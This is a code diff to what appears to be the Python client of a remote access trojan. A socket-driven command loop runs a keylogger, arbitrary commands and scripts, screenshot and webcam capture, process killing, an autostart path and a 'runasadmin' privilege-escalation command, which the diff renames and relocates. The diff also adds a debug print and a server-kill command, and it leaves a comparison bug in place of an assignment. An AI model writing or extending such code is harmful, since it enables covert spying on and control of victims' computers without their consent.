@@ -511,8 +511,6 @@ class ChildSocket(threading.Thread):
                         stdoutput = 'keyloggerStarted'
                     except:
                         stdoutput = 'keyloggerError'
-                elif data.startswith('runasadmin'):
-                    stdoutput = run_as_admin()
                 elif data.startswith('stopKeylogger'):
                     try:
                         keylogger_thread.keyLogger.uninstall_hook_proc()
@@ -537,6 +535,8 @@ class ChildSocket(threading.Thread):
                     stdoutput = terminateProcess(int(data.split(' ')[1]))
                 elif data.startswith('runscript '):
                     stdoutput = execute(data[10:])
+                elif data.startswith('runasadmin'):
+                    stdoutput = run_as_admin()
                 elif data.startswith('ls'):
                     stdoutput = ls()
                 elif data.startswith('myinfo'):
@@ -669,6 +669,9 @@ def from_autostart():
                 if data == 'info':
                     send(s, pc_info(), mode)
                     continue
+                elif data == 'runasadmin':
+                    send(s, run_as_admin(), mode)
+                    continue
                 if data == 'getScreen':
                     send(s, get_screenshot(), mode)
                     continue
@@ -683,9 +686,12 @@ def from_autostart():
                     send(s, 'iamactive', mode)
                     while active:
                         mode, data = receive(s)
+                        print data
                         if data == "lock":
                             active = False
                             break
+                        if data == 'terminateServer':
+                            os._exit(1)
                         if data == 'info':
                             stdoutput = pc_info()
                         elif data.startswith('startChildSocket'):
@@ -694,7 +700,7 @@ def from_autostart():
                             stdoutput = get_screenshot()
                         elif data == 'getWebcam':
                             stdoutput = webcam_shot()
-                        elif data == 'uacEscalation':
+                        elif data == 'runasadmin':
                             stdoutput == run_as_admin()
                         else:
                             stdoutput = exec_(data)
